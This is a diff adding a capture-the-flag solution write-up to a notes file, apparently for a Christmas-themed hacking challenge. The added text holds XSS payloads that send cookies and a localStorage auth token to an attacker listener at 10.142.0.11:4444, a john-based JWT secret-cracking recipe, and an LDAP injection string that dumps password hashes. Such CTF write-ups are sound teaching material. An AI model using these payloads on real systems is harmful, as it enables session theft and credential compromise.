@@ -75,6 +75,53 @@ the hints or the blog posts?
 
 Summarize the reference solution that we found
 
+My solution:
+
+This was a multi stage exploit.
+
+The first stage was XSS via the support request.
+
+First I used
+
+```
+# nc -v -l -p 4444 on l2s
+http -v --form --proxy=http:socks5://@localhost:32080  POST http://edb.northpolechristmastown.com/service \
+uid=alabaster.snowball \
+email=alabaster.snowball@northpolechristmastown.com \
+message="<IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+document.cookie\"></img>"
+```
+
+Then i realized the cookie didn't help, and one needed the token mentioned in the html/javascript source:
+
+```
+# nc -v -l -p 4444 on l2s
+http -v --form --proxy=http:socks5://@localhost:32080  POST http://edb.northpolechristmastown.com/service \
+uid=alabaster.snowball \
+email=alabaster.snowball@northpolechristmastown.com \
+message="<IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');\"></img>"
+```
+
+At that point we had the token I stored in [output/jwt](output/jwt) and used jwt2john.py and john to crack it.  The makefile in output shows the process:
+
+```
+jwt.john: ../tools/jwt2john.py jwt
+	python3 ../tools/jwt2john.py $(shell cat jwt) > jwt.john
+
+john.txt: jwt.john
+	john  --format=HMAC-SHA256 jwt.john
+	john  --format=HMAC-SHA256 jwt.john -show > john.txt
+```
+
+Once logged in, [tools/edb.py](tools/edb.py) was used to exploit the ldap injection vuln using the search string
+
+    name=))(department=it)(|(cn=
+
+and by passing * as the attributes query field. With that query and all
+attributes it is able to grab the entire ldap database including password
+hashes.
+
+The letter page requires a valid password, convienently a google search for santas md5 password quickly finds a valid password.
+
 ** Alternatives
    :PROPERTIES:
    :CUSTOM_ID: alternatives
@@ -88,6 +135,12 @@ Any other, easier solutions?
    :END:
 
 Do we know what issue(s) people were running into?
+
+Cracking the JWT key was tricky without the propper tools.
+My first python based solution was broken.  A fixed version was too slow.
+running it using pypy helped a bit, but the pyjwt library is not optimized for cracking.
+https://github.com/lmammino/jwt-cracker was a bit faster, but john outperformed
+everything.  The hard part was finding out how to use john to crack a jwt secret key.
 
 ** About the Challenge
    :PROPERTIES:
